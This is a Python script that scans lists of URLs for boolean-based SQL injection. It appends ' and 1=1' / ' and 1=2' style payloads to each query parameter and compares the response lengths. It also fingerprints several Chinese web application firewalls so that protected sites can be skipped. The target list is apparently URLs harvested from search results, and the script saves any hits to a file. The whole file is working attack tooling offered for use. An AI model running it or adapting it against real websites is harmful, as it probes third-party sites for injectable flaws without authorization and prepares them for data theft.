#!/usr/bin/python
# __author__ = 'jasonsheh'
# -*- coding:utf-8 -*-

from urllib.parse import urlparse
import requests
import re


class Sql:
    def __init__(self, targets):
        self.targets = targets
        self.target = ''
        self.waf = ''
        self.payload = {' and 1=1': ' and 1=2', "' and '1'='1": "' and '1'='2"}
        self.payload = {' and 1=1': ' and 1=2', "' and '1'='1": "' and '1'='2"}

    @staticmethod
    def _conn(url):
        try:
            conn = requests.get(url, timeout=1, allow_redirects=False)
            if conn.status_code == 500:
                # print("服务器错误!")
                return False
            if conn.status_code == 406:
                # print("无法接受!")
                return False
            if conn.status_code == 302:
                # print("重定向错误!")
                return False
            if conn.status_code != 200:
                # print("连接错误，响应码为%s" % conn.status_code)
                return False
            else:
                return conn
        except:
            # print('无法连接')
            return False

    def _waf(self, conn):
        if 'www.safedog.cn' in conn.text:
            self.waf = '安全狗'
        elif 'safe.webscan.360.cn' in conn.text:
            self.waf = '360'
        elif 'yunsuo.com.cn' in conn.text:
            self.waf = '云锁'
        elif 'D盾' in conn.text:
            self.waf = 'D盾'
        elif 'yundun' in conn.text:
            self.waf = '云盾'
        elif '深空Web应用' in conn.text:
            self.waf = '深空Web'
        elif '玄武盾' in conn.text:
            self.waf = '玄武盾'
        elif '防火墙' in conn.text:
            self.waf = '可能存在'
        else:
            self.waf = ''

    def insert(self, _payload, payload):
        res = ''
        reses = []
        urls = {}
        if '&' in self.target:
            for _url in self.target.split('&'):
                res += _url + '&'
                reses.append(res)
            for _url in reses:
                target = self.target.replace(_url[:-1], _url[:-1]+_payload)
                urls[target] = self.target.replace(_url[:-1], _url[:-1]+payload)
        else:
            urls[self.target+_payload] = self.target+payload
        return urls

    def _scan(self):
        try:
            for url, payload in self.payload.items():
                urls = self.insert(url, payload)
                for key, value in urls.items():
                    conn1 = self._conn(key)  # 正常连接
                    conn = self._conn(value)
                    if conn and conn1:
                        self._waf(conn)
                    else:
                        return False
                    if not (90 > len(conn1.content)-len(conn.content) > -90) and self.waf == '':
                        #print(len(conn1.content)-len(conn.content))
                        print('\n'+value)
                        return self.target
            return False
        except Exception as e:
            print('不存在注入'+str(e))
            return False

    def run(self):
        print("\n# 检测SQL注入:")
        results = []
        for target in self.targets:
            self.target = target
            result = self._scan()
            if result:
                print('可能存在注入:' + result)
                results.append(result)
        return results


def main():
    targets = []
    with open('baidu/2.txt', 'r') as file:
        with open('sql/1.txt', 'a+') as sql_file:
            for url in file:
                targets.append(url.strip())
            try:
                s = Sql(targets)
                _targets = s.run()
                for target in _targets:
                    sql_file.write(target + '\n')
            except Exception as e:
                print(e)


if __name__ == '__main__':
    main()
